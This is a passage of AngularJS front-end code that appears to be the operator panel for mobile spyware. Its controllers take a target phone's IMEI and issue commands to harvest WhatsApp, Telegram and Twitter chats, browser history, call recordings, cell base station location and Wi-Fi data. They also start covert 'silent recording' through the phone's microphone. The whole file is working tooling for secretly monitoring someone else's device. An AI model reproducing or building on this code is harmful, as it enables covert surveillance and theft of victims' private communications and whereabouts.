    $scope.getWhatsAppChat=function(message){
        $scope.whatsAppChatList=JSON.parse(message);
    };
    $scope.changeWNumber=function(){
        $http.post($rootScope.link+'/chat/getWhatsappJson',JSON.stringify({'serial':$rootScope.nowDevice,'mywhatsAppIdNumber':$scope.whatsAppNumber,'type':$scope.whatsAppType})).success(function(data){
            if(data.data){
                $scope.whatsAppList=data.data;
                $scope.whatsAppChatList=JSON.parse(data.data[0].chatMessage);
            }
        })
    };


    $scope.twitterBox=false;
    $scope.getTwitterNew=function(){
        $http.get($rootScope.link+'/task/save?cmd=twitter&enName=twitterChatJson&name=twitter%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95&phoneSerial='+$rootScope.nowDevice+'&type=all').success(function(data){
            if(data.code==200){
                $scope.newBrush=true;
                $timeout(function(){
                    $scope.newBrush=false;
                },1100);
                alert('ok!');
            }else{
                alert('try again!');
            }
        })
    };
    $scope.getTwitterShow=function(){
        $http.get($rootScope.link+'/file/getFile?imei='+$rootScope.nowDevice+'&type=6').success(function(data){
            $scope.twitterList=data.data;
            $scope.telegramBox=false;
            $scope.softwareBox=false;
            $scope.qqBox=false;
            $scope.weChatBox=false;
            $scope.whatsappBox=false;
            $scope.twitterBox=true;
        })
    };
    $scope.downTwitter=function(name){
        window.location.href=$rootScope.link+'/file/twitter?imei='+$rootScope.nowDevice+'&newFileName='+name;
    };

    $scope.telegramBox=false;
    $scope.getTelegramNew=function(){
        $http.get($rootScope.link+'/task/save?cmd=telegram&enName=telegramChatJson&name=telegram%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95&phoneSerial='+$rootScope.nowDevice+'&type=all').success(function(data){
            if(data.code==200){
                $scope.newBrush=true;
                $timeout(function(){
                    $scope.newBrush=false;
                },1100);
                alert('ok!');
            }else{
                alert('try again!');
            }
        })
    };
    $scope.getTelegramShow=function(){
        $http.get($rootScope.link+'/chat/getTelegramAccount?imei='+$rootScope.nowDevice).success(function(data){
            if(data.code==0){
                $scope.telegramNumber=data.data;
                $scope.softwareBox=false;
                $scope.qqBox=false;
                $scope.weChatBox=false;
                $scope.whatsappBox=false;
                $scope.twitterBox=false;
                $scope.telegramBox=true;
                if(data.data){
                    $scope.tNumber=data.data[0].mytelegramIdNumber;
                    $http.post($rootScope.link+'/chat/getTelegramContact', JSON.stringify({'imei':$rootScope.nowDevice, 'mytelegramIdNumber':$scope.tNumber})).success(function(data){
                        $scope.telegramList=data.data;
                        if(data.data){
                            $http.post($rootScope.link+'/chat/getTelegram',JSON.stringify({'imei':$rootScope.nowDevice,'mytelegramIdNumber':data.data[0].mytelegramIdNumber,'uid':data.data[0].uid})).success(function(data){
                                if(data.data){
                                    $scope.telegramChatList=JSON.parse(data.data.chatMessage);
                                }else{
                                    $scope.telegramChatList='';
                                }
                            })
                        }
                    })
                }
            }

        });
    };
    $scope.changeTNumber=function(num){
        $http.post($rootScope.link+'/chat/getTelegramContact', JSON.stringify({'imei':$rootScope.nowDevice, 'mytelegramIdNumber':num})).success(function(data){
            $scope.telegramList=data.data;
            if(data.data){
                $http.post($rootScope.link+'/chat/getTelegram',JSON.stringify({'imei':$rootScope.nowDevice,'mytelegramIdNumber':data.data[0].mytelegramIdNumber,'uid':data.data[0].uid})).success(function(data){
                    if(data.data){
                        $scope.telegramChatList=JSON.parse(data.data.chatMessage);
                    }else{
                        $scope.telegramChatList='';
                    }
                })
            }
        })
    };
    $scope.getTelegramChat=function(uid){
        $http.post($rootScope.link+'/chat/getTelegram',JSON.stringify({'imei':$rootScope.nowDevice,'mytelegramIdNumber':$scope.tNumber,'uid':uid})).success(function(data){
            if(data.data){
                $scope.telegramChatList=JSON.parse(data.data.chatMessage);
            }else{
                $scope.telegramChatList='';
            }
        })
    };
    $scope.teChatFloat=function(flag){
        return flag==0?'left-float':'right-float';
    };
    $scope.teContentFlag=function(flag){
        return flag==0?'left-p':'right-p';
    };
});
app.controller('browserHistoryCtrl',function($rootScope,$scope,$timeout,$http,$interval){
    //导航栏的颜色状态
    $rootScope.navFalse();
    $rootScope.viewDetailedContent=true;
    $rootScope.viewBrowserHistory=true;
    $rootScope.detailList=true;

    $scope.search=''
    $scope.getBrowserNew=function(){
        $http.get($rootScope.link+"/task/save?cmd=gethistory&phoneSerial=" + $rootScope.nowDevice + "&name=浏览器&enName=Browser History").success(function(data){
            if(data.code==200){
                $scope.newBrush=true;
                $timeout(function(){
                    $scope.newBrush=false;
                },1100);
                alert('ok!');
            }else{
                alert('try again!');
            }
        })
    };
    //$timeout(function(){
    //    $http.get($rootScope.link+'/phone/history/get?imei='+$rootScope.nowDevice+'&title=').success(function(data){
    //        $scope.browserList=data.data;
    //    })
    //},0);
    $scope.searchAll=function(){
        $http.get($rootScope.link+'/phone/history/get?imei='+$rootScope.nowDevice+'&title='+$scope.search).success(function(data){
            $scope.browserList=data.data;
        })
    };
    //监听device的变化
    $scope.$watch('nowDevice',function(n){
        $http.get($rootScope.link+'/phone/history/get?imei='+n+'&title='+$scope.search).success(function(data){
            $scope.browserList=data.data;
        })
    });
    //定时器
    var browserInterval=$interval(function(){
        $http.get($rootScope.link+'/phone/history/get?imei='+$rootScope.nowDevice+'&title='+$scope.search).success(function(data){
            $scope.browserList=data.data;
        })
    },10000);
    //离开的时候清理定时器
    $scope.$on('$destroy',function(){
        $interval.cancel(browserInterval);
    })
});
app.controller('recordingControlCtrl',function($rootScope,$scope,$timeout,$http,$interval){
    //导航栏的颜色状态
    $rootScope.navFalse();
    $rootScope.viewDetailedContent=true;
    $rootScope.viewRecordingControl=true;
    $rootScope.detailList=true;
    $scope.showCallRecording=function(){
        $http.get($rootScope.link+'/call/voice/get?imei='+$rootScope.nowDevice+'&startTime='+$rootScope.changeTimeStyle($scope.lastWeek)+'&endTime='+$rootScope.changeTimeStyle($scope.today)).success(function(data){
            if(data.code==0){
                $scope.callRecordingList=data.data;
                $scope.silentRecording=false;
                $scope.callRecording=true;
                $interval.cancel(silentInterval);
                callInterval=$interval(function(){
                    $http.get($rootScope.link+'/call/voice/get?imei='+$rootScope.nowDevice+'&startTime='+$rootScope.changeTimeStyle($scope.lastWeek)+'&endTime='+$rootScope.changeTimeStyle($scope.today)).success(function(data){
                        $scope.callRecordingList=data.data;
                    });
                },10000);
            }
        });
    };
    //通话录音
    $scope.today=$rootScope.getTomorrow();
    $scope.lastWeek=$rootScope.getLastWeek();
    $scope.getCallRecordingNew=function(){
        $http.get($rootScope.link+'/task/save?cmd=getcallvoice&phoneSerial='+$rootScope.nowDevice+'&name=通话录音&enName=callvoice').success(function(data){
            if(data.code==200){
                $scope.newBrush=true;
                $timeout(function(){
                    $scope.newBrush=false;
                },1100);
                alert('ok!');
            }else{
                alert('try again!');
            }
        });
    };
    $scope.callRecording=true;
    //$timeout(function(){
    //    $http.get($rootScope.link+'/call/voice/get?imei='+$rootScope.nowDevice+'&startTime='+$rootScope.changeTimeStyle($scope.lastWeek)+'&endTime='+$rootScope.changeTimeStyle($scope.today)).success(function(data){
    //        $scope.callRecordingList=data.data;
    //    });
    //},0);
    $scope.canDownload=function(s){
        var a;
        if(s==1){
            a='Yes';
        }else if(s==0){
            a='No';
        }else if(s==-1){
            a='Error';
        }
        return a;
    };
    $scope.DownloadRecording=function(path,name){
        $http.get($rootScope.link+'/task/save?cmd=getfile&phoneSerial='+$rootScope.nowDevice+'&name=通话录音&enName=downcallvoice&filename='+path).success(function(data){
            if(data.code==200){
                window.location.href=$rootScope.link+'/call/voice/download?imei='+$rootScope.nowDevice+'&titleName='+name;
            }
        });
    };
    $scope.getTimeSearch=function(){
        $http.get($rootScope.link+'/call/voice/get?imei='+$rootScope.nowDevice+'&startTime='+$rootScope.changeTimeStyle($scope.lastWeek)+'&endTime='+$rootScope.changeTimeStyle($scope.today)).success(function(data){
            $scope.callRecordingList=data.data;
        });
    };
    //时间插件
    $(function() {
        $( "#call-recording-end-time" ).datepicker({
                inline: true,
                showOtherMonths: true
            }).datepicker('widget').wrap('<div class="ll-skin-latoja"/>');
    });
    $(function() {
        $( "#call-recording-start-time" ).datepicker({
            inline: true,
            showOtherMonths: true
        }).datepicker('widget').wrap('<div class="ll-skin-latoja"/>');
    });
    //静默录音
    $scope.mToday=$rootScope.getTomorrow();
    $scope.mLastWeek=$rootScope.getLastWeek();
    $scope.timeInterval=15;
    $scope.getSilentRecordingNew=function(){
        $http.get($rootScope.link+'/task/save?cmd=recoder&phoneSerial=' + $rootScope.nowDevice + '&name=静默录音&enName=Voice&timeLong='+$scope.timeInterval).success(function(data){
            if(data.code==200){
                $scope.newBrush=true;
                $timeout(function(){
                    $scope.newBrush=false;
                },1100);
                alert('ok!');
            }else{
                alert('try again!');
            }
        });
    };
    $scope.silentRecording=false;
    //默认加载静默录音
    $scope.showSilentRecording=function(){
        $http.get($rootScope.link+'/file/getSilentFile?imei='+$rootScope.nowDevice+'&startTime='+$rootScope.changeTimeStyle($scope.mLastWeek)+'&endTime='+$rootScope.changeTimeStyle($scope.mToday)).success(function(data){
            if(data.code==0){
                $scope.callRecording=false;
                $scope.silentRecording=true;
                $scope.assList=data.data;
                $interval.cancel(callInterval);
                silentInterval=$interval(function(){
                    $http.get($rootScope.link+'/file/getSilentFile?imei='+$rootScope.nowDevice+'&startTime='+$rootScope.changeTimeStyle($scope.mLastWeek)+'&endTime='+$rootScope.changeTimeStyle($scope.mToday)).success(function(data){
                        $scope.assList=data.data;
                    })
                },10000);
            }
        });
    };
    $scope.mGetTimeSearch=function(){
        $http.get($rootScope.link+'/file/getSilentFile?imei='+$rootScope.nowDevice+'&startTime='+$rootScope.changeTimeStyle($scope.mLastWeek)+'&endTime='+$rootScope.changeTimeStyle($scope.mToday)).success(function(data){
            if(data.code==0){
                $scope.assList=data.data;
            }
        });
    };
    $scope.mDownload=function(id){
        window.location.href=$rootScope.link+'/file/downLoad?id='+id;
    };
    //时间插件
    $(function() {
        $( "#silent-recording-end-time" ).datepicker({
            inline: true,
            showOtherMonths: true
        }).datepicker('widget').wrap('<div class="ll-skin-latoja"/>');
    });
    $(function() {
        $( "#silent-recording-start-time" ).datepicker({
            inline: true,
            showOtherMonths: true
        }).datepicker('widget').wrap('<div class="ll-skin-latoja"/>');
    });
    //监听device的变化
    $scope.$watch('nowDevice',function(n){
        $http.get($rootScope.link+'/call/voice/get?imei='+n+'&startTime='+$rootScope.changeTimeStyle($scope.lastWeek)+'&endTime='+$rootScope.changeTimeStyle($scope.today)).success(function(data){
            $scope.callRecordingList=data.data;
            $scope.silentRecording=false;
            $scope.callRecording=true;
        });
    });
    //定时器
    var callInterval=$interval(function(){
        $http.get($rootScope.link+'/call/voice/get?imei='+$rootScope.nowDevice+'&startTime='+$rootScope.changeTimeStyle($scope.lastWeek)+'&endTime='+$rootScope.changeTimeStyle($scope.today)).success(function(data){
            $scope.callRecordingList=data.data;
        });
    },10000);
    var silentInterval=$interval(function(){},10000);
    //离开的时候清理定时器
    $scope.$on('$destroy',function(){
        $interval.cancel(callInterval);
        $interval.cancel(silentInterval);
    })
});
app.controller('fileManagerInsideCtrl',function($rootScope,$scope){
    //导航栏的颜色状态
    $rootScope.navFalse();
    $rootScope.viewDetailedContent=true;
    $rootScope.viewFileManagerInside=true;
    $rootScope.detailList=true;
});
app.controller('baseStationCtrl',function($rootScope,$scope,$timeout,$http,$interval){
    //导航栏的颜色状态
    $rootScope.navFalse();
    $rootScope.viewDetailedContent=true;
    $rootScope.viewBaseStation=true;
    $rootScope.detailList=true;

    $scope.getBaseStationNew=function(){
        $http.get($rootScope.link+'/task/save?cmd=getbasestation&phoneSerial=' + $rootScope.nowDevice + '&name=基站&enName=Base Station').success(function(data){
            if(data.code==200){
                $scope.newBrush=true;
                $timeout(function(){
                    $scope.newBrush=false;
                },1100);
                alert('ok!');
            }else{
                alert('try again!');
            }
        });
    };
    //$timeout(function(){
    //    $http.get($rootScope.link+'/base/station/get?imei='+$rootScope.nowDevice).success(function(data){
    //        $scope.baseList=data.data;
    //    });
    //},0);
    //监听device的变化
    $scope.$watch('nowDevice',function(n){
        $http.get($rootScope.link+'/base/station/get?imei='+n).success(function(data){
            $scope.baseList=data.data;
        });
    });
    //定时器
    var baseInterval=$interval(function(){
        $http.get($rootScope.link+'/base/station/get?imei='+$rootScope.nowDevice).success(function(data){
            $scope.baseList=data.data;
        });
    },10000);
    //离开的时候清理定时器
    $scope.$on('$destroy',function(){
        $interval.cancel(baseInterval);
    })
});
app.controller('wifiControlCtrl',function($rootScope,$scope,$timeout,$http,$interval){
    //导航栏的颜色状态
    $rootScope.navFalse();
    $rootScope.viewDetailedContent=true;
    $rootScope.viewWifiControl=true;
    $rootScope.detailList=true;

    $scope.wifiInformationBox=true;
    $scope.getWifiInformationNew=function(){
        $http.get($rootScope.link+"/task/save?cmd=getwifi&phoneSerial=" + $rootScope.nowDevice + "&name=wifi&enName=WIFI").success(function(data){
            if(data.code==200){
                $scope.newBrush=true;
                $timeout(function(){
                    $scope.newBrush=false;
                },1100);
                alert('ok!');
            }else{
                alert('try again!');
            }
        });
    };
    $scope.showWifiInformationBox=function(){
        $scope.nearWifiBox=false;
        $scope.wifiInformationBox=true;
    };
    //$timeout(function(){
    //    $http.get($rootScope.link+'/wifi/info/get?imei='+$rootScope.nowDevice).success(function(data){
    //        $scope.wifiList=data.data;
    //    })
    //},0);

    $scope.nearWifiBox=false;
    $scope.getNearWifiNew=function(){
        $scope.newBrush=true;
        $timeout(function(){
            $scope.newBrush=false;
        },1100);
    };
    $scope.showNearWifiBox=function(){
        $scope.wifiInformationBox=false;
        $scope.nearWifiBox=true;
    };

    //监听device的变化
    $scope.$watch('nowDevice',function(n){
        $http.get($rootScope.link+'/wifi/info/get?imei='+n).success(function(data){
            $scope.wifiList=data.data;
        })
    });
    //定时器
    var wifiInterval=$interval(function(){
        $http.get($rootScope.link+'/wifi/info/get?imei='+$rootScope.nowDevice).success(function(data){
            $scope.wifiList=data.data;
        })
    },10000);
    //离开的时候清理定时器
    $scope.$on('$destroy',function(){
        $interval.cancel(wifiInterval);
    })


});
app.controller('returnModeCtrl',function($rootScope,$scope){
    //导航栏的颜色状态
    $rootScope.navFalse();
    $rootScope.viewDetailedContent=true;
    $rootScope.viewReturnMode=true;
    $rootScope.detailList=true;
});
app.controller('commandCtrl',function($rootScope,$scope){
    //导航栏的颜色状态
    $rootScope.navFalse();
    $rootScope.viewCommand=true;
    $rootScope.detailList=false;
});
app.controller('configurationCtrl',function($rootScope,$scope){
    //导航栏的颜色状态
    $rootScope.navFalse();
    $rootScope.viewConfiguration=true;
    $rootScope.detailList=false;
});

//勾选与全选通用(接口对接的时候完善！)
app.directive('systemCheck',function($timeout){
    return {
        link:function(scope,elem){
            $timeout(function(){
                if(elem.prop('checked')){
                    elem.parent().addClass('on');
                }else{
                    elem.parent().removeClass('on');
                }
            },0);
            elem.click(function(){
                if(elem.prop('checked')){
                    elem.parent().addClass('on');
                }else{
                    elem.parent().removeClass('on');
                }
            });
        }
    }
});
app.directive('systemCheckAll',function($timeout) {
    return {
        link:function(scope,elem){
            $timeout(function(){
                if(elem.prop('checked')){
                    elem.parent().addClass('on');
                }else{
                    elem.parent().removeClass('on');
                }
            },0);
            elem.click(function(){
                if(elem.prop('checked')){
                    elem.parent().addClass('on');
                }else{
                    elem.parent().removeClass('on');
                }
            });
        }
    }
});
